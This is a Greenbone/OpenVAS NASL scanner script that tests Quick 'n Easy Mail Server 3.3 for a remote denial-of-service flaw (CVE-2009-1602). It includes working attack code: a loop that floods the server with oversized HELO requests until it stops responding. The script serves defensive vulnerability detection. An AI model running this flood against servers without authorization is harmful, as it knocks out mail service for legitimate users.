# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100185");
  script_version("2023-11-01T05:05:34+0000");
  script_tag(name:"last_modification", value:"2023-11-01 05:05:34 +0000 (Wed, 01 Nov 2023)");
  script_tag(name:"creation_date", value:"2009-05-06 14:55:27 +0200 (Wed, 06 May 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-1602");
  script_name("Quick 'n Easy Mail Server 3.3 SMTP Request Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_family("SMTP problems");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("smtpserver_detect.nasl", "check_smtp_helo.nasl", "smtp_settings.nasl");
  script_mandatory_keys("smtp/quickneasy/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34814");

  script_tag(name:"summary", value:"Quick 'n Easy Mail Server is prone to a denial of service (DoS)
  vulnerability because it fails to adequately handle multiple socket requests.");

  script_tag(name:"vuldetect", value:"Sends multiple crafted SMTP HELO requests and checks if the
  service is still available.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to cause the affected
  application to reject SMTP requests, denying service to legitimate users.");

  script_tag(name:"affected", value:"The demonstration release of Quick 'n Easy Mail Server 3.3 is
  vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = smtp_get_port(default:25);
banner = smtp_get_banner(port:port);
if(! banner || "Quick 'n Easy Mail Server" >!< banner)
  exit(0);

soc = smtp_open(port:port);
if(!soc)
  exit(0);

send(socket:soc, data:"HELO " + smtp_get_helo_from_kb(port:port) + '\r\n' );
helo = smtp_recv_line(socket:soc);
if(!helo || "421 Service not available" >< helo) {
  smtp_close(socket:soc, check_data:helo);
  exit(0);
}

domain = get_3rdparty_domain();
vtstrings = get_vt_strings();
data = string("HELO ");
data += crap(length:100000, data:vtstrings["default"] + "@" + domain);
data += string("\r\n");

for(i = 0; i < 35; i++) {

  soc = smtp_open(port:port);
  if(!soc)
    exit(0);

  send(socket:soc, data:data);
  ehlotxt = smtp_recv_line(socket:soc);
  smtp_close(socket:soc, check_data:ehlotxt);
  if(egrep(pattern:"421 Service not available", string:ehlotxt)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
